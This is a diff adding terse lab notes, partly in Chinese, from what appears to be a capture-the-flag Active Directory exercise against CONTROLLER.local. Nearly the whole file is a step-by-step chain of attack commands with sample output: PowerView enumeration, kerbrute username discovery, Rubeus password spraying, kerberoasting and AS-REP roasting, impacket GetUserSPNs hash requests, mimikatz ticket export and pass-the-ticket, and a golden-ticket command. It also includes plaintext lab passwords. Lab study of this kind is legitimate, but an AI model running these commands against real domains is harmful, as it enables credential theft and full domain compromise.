@@ -1,0 +1,47 @@
+10.10.226.88
+
+rdesktop -a 16 -z -u Administrator -p 'password123@' 10.10.226.88
+
+
+. .\PowerView.ps1
+
+Get-NetComputer -fulldata | select operatingsystem
+gets a list of all operating systems on the domain
+Get-NetUser | select cn
+gets a list of all users on the domain
+Get-NetGroup | findstr V
+1.下載kerbrute 做用戶名字掃描
+./kerbrute_linux_386 userenum  --dc CONTROLLER.local -d CONTROLLER.local user.txt
+2.發現有以下有效用戶明
+2021/05/16 05:18:06 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
+2021/05/16 05:18:06 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
+2021/05/16 05:18:06 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
+2021/05/16 05:18:12 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
+2021/05/16 05:18:12 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
+2021/05/16 05:18:12 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
+2021/05/16 05:18:12 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
+2021/05/16 05:18:12 >  [+] VALID USERNAME:       user1@CONTROLLER.local
+2021/05/16 05:18:12 >  [+] VALID USERNAME:       user2@CONTROLLER.local
+2021/05/16 05:18:12 >  [+] VALID USERNAME:       user3@CONTROLLER.local
+3.登入到kerberos機器上
+rdesktop -a 16 -z -u Administrator  -p 'P@$$W0rd' 10.10.76.140
+4.使用默認好的Rubeus.exe 每30秒探索TGTs一次
+Rubeus.exe harvest /interval:30
+5.綁定host
+echo 10.10.76.140 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
+6.給定密碼Password1嘗試所有TGT用戶
+Rubeus.exe brute /password:Password1 /noticket
+7.本機運行Rubeus導出kerborast的hash
+Rubeus.exe kerberoast
+8.kali執行python腳本取得kerberoas
+python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.76.140 -request
+9.使用Rubeus導出asreproast密碼
+.\Rubeus.exe asreproast
+10.dump出來後要在hash前面加上23才可以破解
+Kerberos 5 AS-REP etype 23,
+11.使用mimikatz dump hash
+sekurlsa::tickets /export
+kerberos::ptt [0;33546b]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
+12.
+
+Kerberos::golden /user:Administrator /domain:controller.local /sid: /krbtgt: /id:
